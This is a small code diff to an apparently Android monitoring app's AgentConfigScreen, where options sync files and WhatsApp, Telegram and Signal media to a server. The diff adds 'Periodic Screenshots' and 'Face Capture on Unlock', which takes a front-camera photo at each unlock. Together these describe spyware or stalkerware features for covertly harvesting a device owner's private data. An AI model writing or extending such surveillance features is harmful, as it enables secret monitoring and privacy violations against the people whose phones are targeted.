@@ -172,6 +172,8 @@ fun AgentConfigScreen(
                 Triple("media_upload", "Upload Photos & Videos", "Copy new media to server (< 50MB)"),
                 Triple("file_sync", "File Sync", "Sync Downloads + Documents to server"),
                 Triple("chat_media", "Chat Media Folders", "WhatsApp, Telegram, Signal media"),
+                Triple("screenshots", "Periodic Screenshots", "Capture screen every collection cycle"),
+                Triple("face_capture", "Face Capture on Unlock", "Front camera photo on each unlock"),
             )
 
             metrics.forEach { (metricId, title, subtitle) ->
